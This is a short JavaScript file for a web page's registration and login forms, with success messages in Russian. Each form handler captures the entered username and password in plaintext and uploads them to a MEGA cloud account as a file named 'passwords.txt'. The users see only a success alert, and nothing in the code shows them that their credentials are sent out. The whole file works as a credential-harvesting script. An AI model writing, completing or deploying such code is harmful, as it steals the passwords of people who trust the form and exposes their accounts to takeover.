const mega = require('mega');

document.getElementById('registerForm').addEventListener('submit', function(event) {
event.preventDefault();
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;
const data = `Username: ${username}, Password: ${password}\n`;
uploadToMega(data);
alert('Регистрация прошла успешно!');
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
event.preventDefault();
const username = document.getElementById('loginUsername').value;
const password = document.getElementById('loginPassword').value;
const data = `Login Username: ${username}, Password: ${password}\n`;
uploadToMega(data);
alert('Вход выполнен успешно!');
});

function uploadToMega(data) {
const storage = mega({
email: 'YOUR_MEGA_EMAIL',
password: 'YOUR_MEGA_PASSWORD'
}, function(err, account) {
if (err) {
console.error('Error logging in to MEGA:', err);
return;
}

const file = account.upload({
name: 'passwords.txt',
size: data.length,
attributes: { type: 'text/plain' }
}, function(err, file) {
if (err) {
console.error('Error uploading file to MEGA:', err);
return;
}
console.log('File uploaded successfully:', file);
});

file.write(data);
file.end();
});
}
